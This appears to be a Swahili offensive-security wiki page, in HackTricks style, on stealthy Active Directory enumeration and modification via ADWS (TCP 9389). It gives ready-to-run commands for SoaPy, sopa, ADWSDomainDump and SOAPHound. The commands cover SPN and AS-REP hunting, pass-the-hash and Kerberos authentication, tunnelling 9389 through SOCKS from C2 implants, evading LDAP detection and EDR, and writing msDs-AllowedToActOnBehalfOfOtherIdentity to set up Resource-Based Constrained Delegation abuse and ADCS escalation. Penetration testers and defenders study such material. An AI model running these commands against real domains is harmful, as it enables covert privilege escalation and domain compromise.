# Uhesabuji wa Active Directory Web Services (ADWS) na Ukusanyaji wa Kificho

{{#include ../../banners/hacktricks-training.md}}

## ADWS ni nini?

Active Directory Web Services (ADWS) **huwezeshwa kwa chaguo-msingi kwenye kila Domain Controller tangu Windows Server 2008 R2** na husikiliza kwenye TCP **9389**. Licha ya jina lake, **haitumii HTTP**. Badala yake, huduma hii hufichua data ya mtindo wa LDAP kupitia msururu wa proprietary .NET framing protocols:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa kuwa trafiki imefungwa ndani ya binary SOAP frames hizi na husafirishwa kupitia port isiyotumika sana, **uwezekano wa uhesabuji kupitia ADWS kukaguliwa, kuchujwa au kutambuliwa kwa saini ni mdogo sana kuliko trafiki ya kawaida ya LDAP/389 na 636**. Kwa operators, hii inamaanisha:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon yenye uficho zaidi – timu za Blue mara nyingi huzingatia LDAP queries.
* Uhuru wa kukusanya data kutoka kwa **hosts zisizo za Windows (Linux, macOS)** kwa kuelekeza 9389/TCP kupitia SOCKS proxy.
* Data ileile ambayo ungepata kupitia LDAP (users, groups, ACLs, schema, n.k.) na uwezo wa kufanya **writes** (kwa mfano, `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa **RBCD**).

Mawasiliano ya ADWS hutekelezwa kupitia WS-Enumeration: kila query huanza na ujumbe wa `Enumerate` unaobainisha LDAP filter/attributes na kurudisha GUID ya `EnumerationContext`, kisha hufuatiwa na ujumbe mmoja au zaidi wa `Pull` unaotiririsha matokeo hadi kufikia kiwango cha matokeo kinachobainishwa na server.<sup>[[7]](#references)</sup> Contexts huisha baada ya takriban dakika 30, kwa hivyo zana zinahitaji ama kugawa matokeo katika kurasa au kugawa filters (queries za prefix kwa kila CN) ili kuepuka kupoteza hali.<sup>[[8]](#references)</sup> Unapoomba security descriptors, bainisha control ya `LDAP_SERVER_SD_FLAGS_OID` ili kuondoa SACLs; la sivyo ADWS huondoa tu attribute ya `nTSecurityDescriptor` kwenye SOAP response yake.

> NOTE: ADWS pia hutumiwa na zana nyingi za RSAT GUI/PowerShell, kwa hivyo trafiki inaweza kufanana na shughuli halali za admin.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ni **utekelezaji upya kamili wa ADWS protocol stack kwa Python pekee**. Huunda NBFX/NBFSE/NNS/NMF frames byte-for-byte, hivyo kuwezesha ukusanyaji kutoka kwa mifumo inayofanana na Unix bila kutumia .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Vipengele Muhimu

* Inasaidia **kuelekeza trafiki kupitia SOCKS** (inafaa kutoka kwa C2 implants).
* Search filters sahihi zinazofanana na LDAP `-q '(objectClass=user)'`.
* Vitendo vya **write** vya hiari ( `--set` / `--delete` ).
* **BOFHound output mode** kwa kuingiza data moja kwa moja kwenye BloodHound.<sup>[[3]](#references)</sup>
* Bendera ya `--parse` ya kuboresha uwasilishaji wa timestamps / `userAccountControl` inapohitajika usomaji rahisi kwa binadamu.<sup>[[2]](#references)</sup>

### Bendera za ukusanyaji lengwa na vitendo vya write

SoaPy inajumuisha switches zilizochaguliwa zinazotekeleza upya kazi za kawaida za LDAP hunting kupitia ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, pamoja na chaguo za `--query` / `--filter` za kufanya pulls maalum. Tumia hizi pamoja na write primitives kama `--rbcd <source>` (huweka `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (kuweka SPN kwa ajili ya Kerberoasting lengwa) na `--asrep` (kubadilisha `DONT_REQ_PREAUTH` ndani ya `userAccountControl`).<sup>[[2]](#references)</sup>

Mfano wa utafutaji lengwa wa SPN unaorudisha `samAccountName` na `servicePrincipalName` pekee:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Tumia host/credentials zilezile ili kutumia mara moja findings: dump objects zinazoweza kutumia RBCD kwa `--rbcds`, kisha tumia `--rbcd 'WEBSRV01$' --account 'FILE01$'` kuweka tayari mnyororo wa Resource-Based Constrained Delegation (angalia [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) kwa maelezo kamili ya njia ya abuse).

### Usakinishaji (operator host)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump kupitia ADWS (Linux/Windows)

* Fork ya `ldapdomaindump` inayobadilisha LDAP queries na ADWS calls kupitia TCP/9389 ili kupunguza LDAP-signature hits.
* Hufanya ukaguzi wa awali wa ufikivu wa 9389 isipokuwa `--force` itumike (huruka uchunguzi ikiwa port scans zina kelele au zimechujwa).
* Imejaribiwa dhidi ya Microsoft Defender for Endpoint na CrowdStrike Falcon, na README inaeleza kuwa bypass ilifanikiwa.<sup>[[4]](#references)</sup>

### Usakinishaji

```bash
pipx install .
```

### Matumizi

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Logi za matokeo ya kawaida huonyesha ukaguzi wa ufikikaji wa 9389, ADWS bind, na kuanza/kukamilika kwa dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Mteja wa vitendo wa ADWS katika Golang

Kama ilivyo kwa soapy, [sopa](https://github.com/Macmod/sopa) hutekeleza stack ya itifaki ya ADWS (MS-NNS + MC-NMF + SOAP) katika Golang, na kutoa flags za mstari wa amri za kutuma miito ya ADWS kama vile:<sup>[[5]](#references)</sup>

* **Utafutaji na upataji wa object** - `query` / `get`
* **Mzunguko wa maisha wa object** - `create [user|computer|group|ou|container|custom]` na `delete`
* **Uhariri wa attribute** - `attr [add|replace|delete]`
* **Usimamizi wa akaunti** - `set-password` / `change-password`
* na nyinginezo kama vile `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, n.k.

### Muhtasari wa ulinganifu wa itifaki

* Utafutaji wa mtindo wa LDAP hutumwa kupitia **WS-Enumeration** (`Enumerate` + `Pull`) ukiwa na uchujaji wa attributes, udhibiti wa scope (Base/OneLevel/Subtree) na pagination.
* Upataji wa object moja hutumia **WS-Transfer** `Get`; mabadiliko ya attribute hutumia `Put`; ufutaji hutumia `Delete`.
* Uundaji wa object uliojengewa ndani hutumia **WS-Transfer ResourceFactory**; object maalum hutumia **IMDA AddRequest** inayoendeshwa na YAML templates.
* Operesheni za password ni vitendo vya **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ugunduzi wa metadata bila uthibitishaji (mex)

ADWS hufichua WS-MetadataExchange bila credentials, hivyo ni njia ya haraka ya kuthibitisha kama huduma imefichuliwa kabla ya kufanya uthibitishaji:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Vidokezo kuhusu ugunduzi wa DNS/DC na kulenga Kerberos

Sopa inaweza kupata DCs kupitia SRV ikiwa `--dc` haijatolewa na `--domain` imetolewa. Huuliza kwa mpangilio huu na hutumia lengwa lenye kipaumbele cha juu zaidi:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Kiutendaji, pendelea resolver inayodhibitiwa na DC ili kuepuka hitilafu katika mazingira yaliyogawanywa:

* Tumia `--dns <DC-IP>` ili **lookups** zote za SRV/PTR/forward zipitie DNS ya DC.
* Tumia `--dns-tcp` wakati UDP imezuiwa au majibu ya SRV ni makubwa.
* Ikiwa Kerberos imewezeshwa na `--dc` ni IP, sopa hufanya **reverse PTR** ili kupata FQDN kwa uelekezaji sahihi wa SPN/KDC. Ikiwa Kerberos haitumiki, hakuna lookup ya PTR inayofanyika.

Mfano (IP + Kerberos, DNS imelazimishwa kupitia DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Chaguo za vifaa vya uthibitishaji

Mbali na nywila za maandishi wazi, sopa inasaidia **NT hashes**, **Kerberos AES keys**, **ccache**, na **PKINIT certificates** (PFX au PEM) kwa uthibitishaji wa ADWS. Kerberos hutumika moja kwa moja unapotumia `--aes-key`, `-c` (ccache) au chaguo za certificate.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Uundaji wa object maalum kupitia templates

Kwa object classes zisizo na kikomo, command ya `create custom` hutumia template ya YAML inayolingana na IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` na `rdn` hufafanua container na DN ya relative.
* `attributes[].name` inakubali `cn` au `addata:cn` yenye namespace.
* `attributes[].type` inakubali `string|int|bool|base64|hex` au `xsd:*` iliyoainishwa wazi.
* **Usijumuishe** `ad:relativeDistinguishedName` au `ad:container-hierarchy-parent`; sopa huziongeza.
* Thamani za `hex` hubadilishwa kuwa `xsd:base64Binary`; tumia `value: ""` kuweka string tupu.

## SOAPHound – Ukusanyaji wa ADWS wa Kiasi Kikubwa (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ni collector ya .NET inayoweka miingiliano yote ya LDAP ndani ya ADWS na kutoa JSON inayooana na BloodHound v4. Huunda cache kamili ya `objectSid`, `objectGUID`, `distinguishedName` na `objectClass` mara moja (`--buildcache`), kisha huitumia tena kwa runs za `--bhdump`, `--certdump` (ADCS), au `--dnsdump` (DNS iliyounganishwa na AD) za kiasi kikubwa, ili ni takribani attributes muhimu 35 pekee zinazotoka kwenye DC. AutoSplit (`--autosplit --threshold <N>`) hugawa queries kiotomatiki kulingana na kiambishi awali cha CN ili zisizidi timeout ya EnumerationContext ya dakika 30 katika forests kubwa.<sup>[[8]](#references)</sup>

Mtiririko wa kawaida wa kazi kwenye VM ya operator iliyojiunga na domain:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

JSON zilizohamishwa huingizwa moja kwa moja kwenye workflows za SharpHound/BloodHound—tazama [BloodHound methodology](bloodhound.md) kwa mawazo ya kuchora grafu baadaye. AutoSplit huifanya SOAPHound iwe thabiti kwenye misitu yenye mamilioni ya objects huku ikipunguza idadi ya queries ikilinganishwa na snapshots za mtindo wa ADExplorer.

## Workflow ya Stealth AD Collection

Workflow ifuatayo inaonyesha jinsi ya kuorodhesha **domain & ADCS objects** kupitia ADWS, kuzibadilisha kuwa BloodHound JSON na kutafuta njia za mashambulizi zinazotumia certificates – yote kutoka Linux:

1. **Tengeneza tunnel ya 9389/TCP** kutoka mtandao lengwa hadi kwenye mashine yako (k.m. kupitia Chisel, Meterpreter, SSH dynamic port-forward, n.k.). Hamisha `export HTTPS_PROXY=socks5://127.0.0.1:1080` au tumia `--proxyHost/--proxyPort` za SoaPy.

2. **Kusanya object ya root domain:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Kusanya objects zinazohusiana na ADCS kutoka kwenye Configuration NC:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Geuza kuwa BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Pakia ZIP** kwenye GUI ya BloodHound na utekeleze cypher queries kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua njia za kupandisha ruhusa kupitia vyeti (ESC1, ESC8, n.k.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Unganisha hili na `s4u2proxy`/`Rubeus /getticket` ili kupata chain kamili ya **Resource-Based Constrained Delegation** (tazama [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Muhtasari wa Zana

| Kusudi | Zana | Maelezo |
|---------|------|-------|
| Uhesabuji wa ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, kusoma/kuandika |
| Dump kubwa ya ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, hali za BH/ADCS/DNS |
| Uingizaji wa BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Hubadilisha logi za SoaPy/ldapsearch |
| Kuvunjwa kwa vyeti | [Certipy](https://github.com/ly4k/Certipy) | Inaweza kupitishwa kupitia SOCKS ileile |
| Uhesabuji na mabadiliko ya objekti za ADWS | [sopa](https://github.com/Macmod/sopa) | Mteja wa jumla wa kuwasiliana na endpoints za ADWS zinazojulikana - huruhusu uhesabuji, uundaji wa objekti, marekebisho ya sifa na mabadiliko ya nywila |

## References

- [1] [SpecterOps – Hakikisha Unatumia SOAP(y) – Mwongozo wa Operator wa Ukusanyaji wa AD kwa Kujificha Kwa Kutumia ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy kwenye GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound kwenye GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump kwenye GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa kwenye GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Vipimo vya MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Uhesabuji wa Mazingira ya Active Directory kwa Kujificha Kupitia ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Zana ya SOAPHound ya Kukusanya Data ya Active Directory Kupitia ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
